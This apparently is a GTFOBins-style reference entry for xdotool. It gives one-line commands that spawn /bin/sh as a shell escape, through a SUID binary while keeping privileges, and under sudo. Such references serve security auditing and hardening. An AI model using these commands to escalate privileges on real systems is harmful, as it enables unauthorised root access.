---
description: This requires a running X server.
functions:
  shell:
    - code: xdotool exec --sync /bin/sh
  suid:
    - code: ./xdotool exec --sync /bin/sh -p
  sudo:
    - code: sudo xdotool exec --sync /bin/sh
---
